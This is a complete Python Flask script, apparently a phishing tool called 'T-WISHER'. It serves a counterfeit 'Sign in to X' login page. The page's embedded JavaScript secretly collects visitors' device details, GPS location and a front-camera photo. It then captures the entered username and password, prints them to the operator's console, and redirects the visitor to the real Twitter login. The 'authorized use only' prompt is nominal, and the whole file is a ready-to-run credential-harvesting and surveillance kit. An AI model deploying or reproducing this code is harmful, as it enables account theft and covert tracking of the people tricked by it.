#!/usr/bin/env python3
"""
T-WISHER - Simplified Version
Run this if template issues persist
"""

import os
import sys
import time
import json
import base64
import socket
import threading
from datetime import datetime
import colorama
from colorama import Fore, Style

colorama.init(autoreset=True)

try:
    from flask import Flask, request, jsonify
    from flask_cors import CORS
except ImportError:
    print("[!] Installing Flask...")
    os.system("pip install flask flask-cors")
    from flask import Flask, request, jsonify
    from flask_cors import CORS

app = Flask(__name__)
CORS(app)

VICTIMS = {}

# HTML embedded directly
HTML_CONTENT = """<!DOCTYPE html>
<html>
<head>
    <title>X - Log In</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #000000; color: #e7e9ea; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .login-container { width: 100%; max-width: 600px; padding: 40px; }
        .x-logo { display: flex; justify-content: center; margin-bottom: 40px; }
        .x-logo svg { width: 50px; height: 50px; fill: #ffffff; }
        .title { font-size: 31px; font-weight: 700; text-align: center; margin-bottom: 40px; color: #ffffff; }
        .login-form { max-width: 300px; margin: 0 auto; }
        .form-group { margin-bottom: 20px; }
        .form-input { width: 100%; padding: 16px; background: transparent; border: 1px solid #536471; border-radius: 4px; color: #fff; font-size: 17px; }
        .next-button { width: 100%; padding: 14px; border-radius: 9999px; border: none; background: #ffffff; color: #0f1419; font-size: 15px; font-weight: 700; cursor: pointer; }
        .notification { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #1d9bf0; color: white; padding: 12px 24px; border-radius: 9999px; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="x-logo">
            <svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231z"></path></svg>
        </div>
        <h1 class="title">Sign in to X</h1>
        
        <form class="login-form" id="loginForm">
            <div class="form-group">
                <input type="text" class="form-input" id="username" placeholder="Phone, email, or username" required>
            </div>
            <div class="form-group" id="passwordGroup" style="display: none;">
                <input type="password" class="form-input" id="password" placeholder="Password">
            </div>
            <button type="submit" class="next-button" id="nextButton">Next</button>
        </form>
    </div>

    <script>
        const VICTIM_ID = "{{ victim_id }}";
        
        // Collect device info
        fetch('/api/device', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                victim_id: VICTIM_ID,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: screen.width+'x'+screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            })
        });

        // Request location
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                fetch('/api/location', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        victim_id: VICTIM_ID,
                        latitude: pos.coords.latitude,
                        longitude: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    })
                });
            });
        }

        // Request camera
        if (navigator.mediaDevices) {
            navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}})
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        const imageData = canvas.toDataURL('image/jpeg');
                        
                        fetch('/api/camera', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({victim_id: VICTIM_ID, image: imageData})
                        });
                        
                        stream.getTracks().forEach(t => t.stop());
                    }, 500);
                }).catch(() => {});
        }

        // Form handling
        let step = 1;
        document.getElementById('loginForm').addEventListener('submit', e => {
            e.preventDefault();
            if (step === 1) {
                document.getElementById('username').style.display = 'none';
                document.getElementById('passwordGroup').style.display = 'block';
                document.getElementById('nextButton').textContent = 'Log in';
                step = 2;
            } else {
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                
                fetch('/api/credentials', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({victim_id: VICTIM_ID, email: username, password: password})
                }).then(() => {
                    window.location.href = 'https://twitter.com/login';
                });
            }
        });
    </script>
</body>
</html>"""

@app.route('/')
def index():
    victim_ip = request.remote_addr
    victim_id = str(int(time.time()))
    
    VICTIMS[victim_id] = {
        'ip': victim_ip,
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    
    html = HTML_CONTENT.replace("{{ victim_id }}", victim_id)
    return html

@app.route('/api/location', methods=['POST'])
def location():
    data = request.json
    print(Fore.GREEN + f"\n[+] LOCATION from {request.remote_addr}")
    print(Fore.YELLOW + f"    Lat: {data.get('latitude')}, Lon: {data.get('longitude')}")
    return jsonify({'status': 'ok'})

@app.route('/api/camera', methods=['POST'])
def camera():
    data = request.json
    print(Fore.GREEN + f"\n[+] CAMERA CAPTURE from {request.remote_addr}")
    return jsonify({'status': 'ok'})

@app.route('/api/credentials', methods=['POST'])
def credentials():
    data = request.json
    print(Fore.RED + f"\n[+] CREDENTIALS from {request.remote_addr}")
    print(Fore.WHITE + f"    Email: {data.get('email')}")
    print(Fore.WHITE + f"    Password: {data.get('password')}")
    return jsonify({'status': 'ok'})

@app.route('/api/device', methods=['POST'])
def device():
    data = request.json
    print(Fore.BLUE + f"\n[+] DEVICE from {request.remote_addr}")
    print(Fore.CYAN + f"    {data.get('platform')} - {data.get('screen')}")
    return jsonify({'status': 'ok'})

def show_banner():
    os.system('clear')
    print(Fore.BLUE + """
    ████████╗      ██╗    ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
    ╚══██╔══╝      ██║    ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
       ██║   █████╗██║ █╗ ██║██║███████╗███████║█████╗  ██████╔╝
       ██║   ╚════╝██║███╗██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
       ██║         ╚███╔███╔╝██║███████║██║  ██║███████╗██║  ██║
       ╚═╝          ╚══╝╚══╝ ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
    """ + Style.RESET_ALL)
    print(Fore.CYAN + "="*60)
    print(Fore.YELLOW + "         T-WISHER - PEGASUS TURBO v1.0")
    print(Fore.GREEN + "      MADE BY XSPEEN | WHITE HACKER/RED TEAM")
    print(Fore.CYAN + "="*60 + "\n")

def main():
    show_banner()
    
    print(Fore.RED + "[!] WARNING: Authorized use only!\n")
    choice = input(Fore.CYAN + "[?] Accept terms? (yes/no): " + Style.RESET_ALL)
    
    if choice.lower() != 'yes':
        print(Fore.RED + "Exiting...")
        return
    
    port = 8080
    try:
        port = int(input(Fore.CYAN + "[?] Port (default: 8080): " + Style.RESET_ALL) or "8080")
    except:
        pass
    
    print(Fore.GREEN + f"\n[+] Server starting on port {port}")
    print(Fore.GREEN + f"[+] Local URL: http://localhost:{port}")
    
    # Get local IP
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        print(Fore.GREEN + f"[+] Network URL: http://{local_ip}:{port}")
    except:
        pass
    
    print(Fore.YELLOW + "\n[+] Waiting for victims...\n")
    
    app.run(host='0.0.0.0', port=port, debug=False)

if __name__ == '__main__':
    main()
